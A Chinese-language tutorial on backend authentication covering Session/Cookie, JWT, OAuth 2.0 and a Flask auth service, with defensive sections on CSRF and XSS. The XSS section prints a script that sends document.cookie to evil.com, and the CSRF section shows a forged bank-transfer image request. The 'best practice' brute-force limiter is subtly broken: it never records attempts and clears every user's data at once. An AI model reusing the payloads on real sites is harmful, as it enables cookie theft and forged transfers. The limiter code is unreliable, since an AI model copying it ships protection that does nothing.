# 鉴权原理与实战：从 HTTP Basic 到 JWT (Interactive Guide to Authentication)

> 💡 **学习指南**：本章节带你深入理解后端系统的"门禁系统"——鉴权与授权。我们将从最基础的"你是谁"讲起，一步步掌握 Session、JWT、OAuth2.0 等现代鉴权方案。

<AuthEvolutionDemo />

## 0. 引言：系统的"门禁"

你登录微信后，为什么关掉再打开还是登录状态？
你访问 B 站，为什么知道你是大会员还是普通用户？
你用微信扫码登录第三方网站，为什么不用输入密码？

这背后都有一个核心系统：**鉴权与授权 (Authentication & Authorization)**。

如果把后端系统比作一栋大楼：

- **鉴权 (Authentication)**：确认"你是谁"（验证身份证/门禁卡）。
- **授权 (Authorization)**：确认"你能去哪里"（VIP 能进 VIP 休息室，普通用户不行）。

### 0.1 为什么要鉴权？

只有一个理由：**保护资源**。

- **隐私保护**：你的个人信息、聊天记录，只有你能看。
- **权限控制**：管理员可以删除用户，普通用户不行。
- **防止滥用**：防止恶意调用、刷接口。

<AuthBasicsDemo />

**关键点**：鉴权是第一道防线，所有敏感操作都必须先验证身份。

---

## 1. 基础概念：认证 vs 授权

### 1.1 认证 (Authentication)：你是谁？

确认用户的身份。

- _例子_：输入用户名密码、刷指纹、人脸识别。
- _输出_：一个代表"你"的令牌（Token）。
- _英文简称_：**AuthN**

### 1.2 授权 (Authorization)：你能干什么？

确认用户有哪些权限。

- _例子_：管理员可以删除文章，普通用户只能点赞。
- _输出_：允许或拒绝访问。
- _英文简称_：**AuthZ**

### 1.3 两者的关系

```
用户请求 → 认证 (你是谁？) → 授权 (你能做吗？) → 执行业务逻辑
           ↓                        ↓
      验证身份               检查权限
      (Token 有效？)         (有 delete 权限？)
```

<AuthNvsAuthZDemo />

**关键点**：先认证，再授权。只有确认了"你是谁"，才能判断"你能干什么"。

---

## 2. 方案演进史

### 2.1 第一代：HTTP Basic Authentication

最古老的方案，直接把用户名密码放在 HTTP 头里。

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **优点**：简单，所有浏览器都支持。
- **缺点**：
  - 不安全（Base64 可解码，相当于明文）。
  - 每次请求都要传密码（容易被截获）。
  - 无法主动注销（除非关闭浏览器）。

**结论**：只适合内部测试工具，绝不用于生产环境。

### 2.2 第二代：Session + Cookie

Web 开发的经典方案。

**流程**：

```
1. 用户登录 (POST /login)
   → 服务器验证用户名密码
   → 创建 Session（在服务器内存或 Redis）
   → 返回 Set-Cookie: session_id=abc123

2. 后续请求
   → 浏览器自动带上 Cookie: session_id=abc123
   → 服务器根据 session_id 查找 Session
   → 找到就认为"你是你"
```

**代码示例**：

```python
# 后端 (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # 验证用户名密码
    user = db.authenticate(username, password)
    if user:
        # 创建 Session
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "用户名或密码错误"}, 401

@app.route("/api/admin/users")
def get_users():
    # 检查 Session
    if "user_id" not in session:
        return {"error": "未登录"}, 401

    # 检查权限
    if session.get("role") != "admin":
        return {"error": "权限不足"}, 403

    # 执行业务逻辑
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**优点**：

- 简单直观，易于理解。
- 服务端可以主动注销（删除 Session）。

**缺点**：

- **服务器有状态**：需要存储 Session，多台服务器需要共享（如 Redis）。
- **跨域困难**：Cookie 默认不能跨域（CORS 问题）。
- **CSRF 攻击**：恶意网站可以冒用你的 Cookie。

**结论**：适合传统 Web 应用（服务器端渲染），不适合移动端和现代 SPA。

### 2.3 第三代：Token (JWT)

现代 Web 的主流方案。

**核心思想**：不在服务端存储状态，把用户信息加密成 Token，放在客户端。

**JWT 结构**：

```
JWT = Header.Payload.Signature

例子:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header**：算法信息（如 `{"alg": "HS256", "typ": "JWT"}`）。
- **Payload**：用户信息（如 `{"user_id": 123, "role": "admin", "exp": 1616239022}`）。
- **Signature**：签名（防篡改）。

**流程**：

```python
# 1. 用户登录
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # 生成 JWT
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # 24 小时过期
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "用户名或密码错误"}, 401

# 2. 后续请求
@app.route("/api/admin/users")
def get_users():
    # 从 Header 获取 Token
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "未提供 Token"}, 401

    token = auth_header.split(" ")[1]

    try:
        # 验证并解析 Token
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Token 已过期"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token 无效"}, 401

    # 检查权限
    if payload.get("role") != "admin":
        return {"error": "权限不足"}, 403

    # 执行业务逻辑
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**优点**：

- **无状态**：服务端不存储 Session，易于横向扩展。
- **跨域友好**：放在 Header 里，不受 Cookie 跨域限制。
- **移动端友好**：原生 App 也能轻松使用。
- **信息丰富**：Payload 可以存用户信息、权限等。

**缺点**：

- **无法主动注销**：Token 一旦签发，在过期前一直有效（除非用黑名单）。
- **Payload 可见**：Base64 编码，不能存敏感信息（如密码）。
- **Token 过大**：每次请求都要带上，几百字节。

**结论**：现代 Web 和移动端的标准方案。

<SessionVsJWTDemo />

---

## 3. OAuth 2.0：第三方登录

你肯定见过这个按钮："使用微信登录"、"使用 Google 登录"。

这就是 **OAuth 2.0**：一个**授权**框架（不是认证！）。

### 3.1 核心角色

| 角色                     | 说明               | 例子               |
| :----------------------- | :----------------- | :----------------- |
| **Resource Owner**       | 资源所有者（用户） | 你                 |
| **Client**               | 第三方应用         | 某个网站           |
| **Authorization Server** | 授权服务器         | 微信、Google       |
| **Resource Server**      | 资源服务器         | 微信的用户信息 API |

### 3.2 授权码模式 (Authorization Code Flow)

最安全的模式，适合有后端的服务器。

**流程**：

```
1. 用户点击"使用微信登录"
   → 跳转到微信授权页面
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. 用户扫码并同意授权
   → 微信重定向回你的网站
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. 你的后端用 code 换取 access_token
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → 返回: { "access_token": "...", "openid": "..." }

4. 用 access_token 获取用户信息
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → 返回: { "nickname": "张三", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**代码示例**：

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. 重定向到微信授权页面
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. 获取 code
    code = request.args.get("code")
    state = request.args.get("state")

    # 验证 state（防 CSRF）
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. 用 code 换取 access_token
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. 获取用户信息
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. 本地创建或更新用户
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. 生成本系统的 JWT
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**关键点**：

- **code 只能用一次**：用完即失效，防止截获。
- **state 防 CSRF**：生成随机字符串，回调时验证，防止恶意网站伪造。
- **redirect_uri 必须匹配**：提前在微信开放平台注册，防止重定向攻击。

### 3.3 其他模式

| 模式                                | 适用场景                     | 安全性           |
| :---------------------------------- | :--------------------------- | :--------------- |
| **授权码模式**                      | 有后端的服务器               | ⭐⭐⭐⭐⭐       |
| **简化模式 (Implicit)**             | 纯前端应用（SPA）            | ⭐⭐⭐（不推荐） |
| **密码模式 (Resource Owner)**       | 高度信任的应用（如官方 App） | ⭐⭐             |
| **客户端模式 (Client Credentials)** | 服务器间通信（无用户）       | ⭐⭐⭐⭐         |

<OAuth2ModesDemo />

---

## 4. 实战：设计一个完整的鉴权系统

### 4.1 需求分析

- **多端支持**：Web、iOS、Android。
- **第三方登录**：微信、Google。
- **权限控制**：普通用户、VIP、管理员。
- **安全**：防刷、防劫持、防重放。

### 4.2 架构设计

```
┌─────────────┐
│   客户端     │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting (限流)          │
│  - Token Validation (校验)       │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service (鉴权服务)     │
│  - 注册、登录                    │
│  - Token 签发与验证              │
│  - OAuth 2.0 集成                │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services             │
│  - User Service                  │
│  - Order Service                 │
│  - Payment Service               │
└─────────────────────────────────┘
```

### 4.3 数据库设计

```sql
-- 用户表
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- bcrypt 哈希
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- 第三方登录绑定表
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- 第三方的用户 ID
    access_token TEXT,  -- 加密存储
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Token 黑名单（用于主动注销）
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JWT 的 JTI (唯一标识)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 代码实现

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # 生产环境用环境变量

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. 检查用户名是否存在
        if db.get_user_by_username(username):
            raise ValueError("用户名已存在")

        # 2. 哈希密码（bcrypt）
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. 创建用户
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. 签发 Token
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. 查询用户
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("用户名或密码错误")

        # 2. 验证密码
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("用户名或密码错误")

        # 3. 签发 Token
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (短期，如 1 小时)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # 唯一标识
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (长期，如 30 天)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # access_token 过期时间（秒）
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Refresh token 已过期")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token 无效")

    def logout(self, token: str):
        # 将 Token 加入黑名单
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # 检查是否在黑名单中
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token 已注销")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token 已过期")
        except jwt.InvalidTokenError:
            raise ValueError("Token 无效")

# API 装饰器
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # 从 Header 获取 Token
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "未提供 Token"}, 401

            token = auth_header.split(" ")[1]

            try:
                # 验证 Token
                payload = auth_service.verify_token(token)
                # 将用户信息注入到请求上下文
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "未登录"}, 401

            if request.user["role"] not in roles:
                return {"error": "权限不足"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# 使用示例
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. 安全最佳实践

### 5.1 密码存储

**❌ 错误做法**：

```python
# 明文存储（绝对不行！）
db.save_password(username, password)

# MD5 / SHA1 哈希（不够安全，容易被彩虹表破解）
hash = md5(password)
db.save_password(username, hash)
```

**✅ 正确做法**：

```python
# bcrypt（自适应哈希，慢哈希防暴力破解）
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # rounds 越大越安全，但也越慢
)

# 验证
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # 密码正确
```

**为什么 bcrypt？**

- **慢**：故意设计得很慢（毫秒级），防暴力破解。
- **自适应**：可以调整 rounds，随硬件变强而增强。
- **加盐**：自带随机盐，防彩虹表。

<PasswordHashingDemo />

### 5.2 防暴力破解

- **限流**：同一个 IP / 用户名，1 分钟只能试 5 次。
- **验证码**：失败 3 次后要求输入验证码。
- **账号锁定**：失败 10 次后锁定账号 30 分钟。

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """返回 (尝试次数, 第一次尝试时间)"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # 1 分钟内清零
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # 超过 5 次，拒绝
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # 重新缓存

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # 检查限流
    if not check_rate_limit(username):
        return {"error": "尝试次数过多，请 1 分钟后再试"}, 429

    password = request.json["password"]

    # 验证密码
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # 登录成功，清空计数
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # 登录失败，记录
        record_login_attempt(username)
        return {"error": "用户名或密码错误"}, 401
```

### 5.3 防 CSRF (Cross-Site Request Forgery)

**攻击场景**：
你登录了银行网站 `bank.com`，然后访问了恶意网站 `evil.com`。`evil.com` 的页面里有一段代码：

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

你的浏览器会带上银行的 Cookie 发起这个请求（跨域请求），导致资金被转走。

**防御措施**：

1.  **CSRF Token**：
    - 服务端生成随机 Token，放在表单里。
    - 提交时验证 Token 是否匹配。

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # 验证 CSRF Token
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token 无效"}, 403

    # 执行转账
    ...
```

2.  **SameSite Cookie**：
    - 设置 Cookie 的 `SameSite` 属性为 `Strict` 或 `Lax`。

```python
# Flask 示例
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # 或 'Strict'
    SESSION_COOKIE_SECURE=True      # 只允许 HTTPS
)
```

3.  **使用 JWT（不用 Cookie）**：
    - JWT 存在 `localStorage`，不会自动带上，天然防 CSRF。

<CSRFDefenseDemo />

### 5.4 防 XSS (Cross-Site Scripting)

**攻击场景**：
恶意用户在评论区输入：

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

如果网站直接渲染这段内容，其他用户的 Cookie 就会被盗走。

**防御措施**：

1.  **输出转义**：
    - 把 `<` 转成 `&lt;`，`>` 转成 `&gt;`。

```python
import html

def render_comment(comment):
    # 转义 HTML
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)**：
    - 设置 HTTP 头，限制脚本来源。

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**：
    - 设置 Cookie 的 `HttpOnly` 属性，JavaScript 无法读取。

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. 总结与学习路线

鉴权是后端系统的"基本功"，掌握了它才能构建安全可靠的应用。

### 6.1 核心知识点

| 知识点                | 重要程度   | 难度 | 实战频率 |
| :-------------------- | :--------- | :--- | :------- |
| **Session + Cookie**  | ⭐⭐⭐⭐   | 中   | 高       |
| **JWT**               | ⭐⭐⭐⭐⭐ | 低   | 极高     |
| **OAuth 2.0**         | ⭐⭐⭐⭐   | 高   | 高       |
| **密码哈希 (bcrypt)** | ⭐⭐⭐⭐⭐ | 低   | 极高     |
| **限流与防暴力破解**  | ⭐⭐⭐⭐⭐ | 中   | 极高     |
| **CSRF 防御**         | ⭐⭐⭐⭐   | 中   | 中       |
| **XSS 防御**          | ⭐⭐⭐⭐   | 低   | 高       |

### 6.2 学习路线

1.  **入门**（1-2 天）：
    - 理解认证 vs 授权。
    - 掌握 Session + Cookie 的原理。
    - 实现一个简单的登录注册功能。

2.  **进阶**（1 周）：
    - 学习 JWT 的原理和实现。
    - 实现基于 JWT 的鉴权系统。
    - 掌握密码哈希（bcrypt）。

3.  **实战**（2-4 周）：
    - 集成 OAuth 2.0（微信、Google 登录）。
    - 实现限流、防暴力破解。
    - 防御 CSRF、XSS 等常见攻击。

4.  **深入**（持续）：
    - 学习 RBAC（基于角色的访问控制）。
    - 研究 SSO（单点登录）。
    - 探索 Zero Trust Architecture（零信任架构）。

### 6.3 推荐资源

- **标准**：
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **文章**：
  - JWT.io: https://jwt.io/
  - OAuth 2.0 简体中文版: https://oauth.net/2/
- **工具**：
  - jwt.io (JWT 在线调试)
  - Postman (API 测试)

---

## 7. 名词速查表 (Glossary)

| 名词              | 全称                        | 解释                                                                               |
| :---------------- | :-------------------------- | :--------------------------------------------------------------------------------- |
| **AuthN**         | Authentication              | **认证**。确认"你是谁"（如输入密码验证身份）。                                     |
| **AuthZ**         | Authorization               | **授权**。确认"你能干什么"（如管理员才能删除）。                                   |
| **Session**       | -                           | **会话**。服务端存储的用户状态信息。                                               |
| **Cookie**        | -                           | **小甜饼**。浏览器存储的小段数据，每次请求都会自动带上。                           |
| **JWT**           | JSON Web Token              | **JSON Web 令牌**。一种无状态的认证方案，包含 Header、Payload、Signature 三部分。  |
| **OAuth 2.0**     | -                           | **开放授权**。第三方登录的标准化框架（如"用微信登录"）。                           |
| **SSO**           | Single Sign-On              | **单点登录**。登录一次，就可以访问多个应用（如 Google 账号登录所有 Google 服务）。 |
| **RBAC**          | Role-Based Access Control   | **基于角色的访问控制**。根据用户的角色（如 admin、user）决定权限。                 |
| **CSRF**          | Cross-Site Request Forgery  | **跨站请求伪造**。攻击者诱导用户发送恶意请求（如用你的 Cookie 发起转账）。         |
| **XSS**           | Cross-Site Scripting        | **跨站脚本攻击**。攻击者在网页注入恶意脚本（如盗取 Cookie）。                      |
| **bcrypt**        | -                           | **密码哈希算法**。一种慢哈希算法，专门用于密码存储，防暴力破解。                   |
| **Access Token**  | -                           | **访问令牌**。短期有效的令牌，用于访问 API。                                       |
| **Refresh Token** | -                           | **刷新令牌**。长期有效的令牌，用于获取新的 Access Token。                          |
| **Scope**         | -                           | **权限范围**。OAuth 2.0 中的概念，表示第三方应用请求的权限（如读取用户信息）。     |
| **PKCE**          | Proof Key for Code Exchange | **授权码交换的证明密钥**。OAuth 2.0 的扩展，用于公共客户端（如 SPA）的安全增强。   |
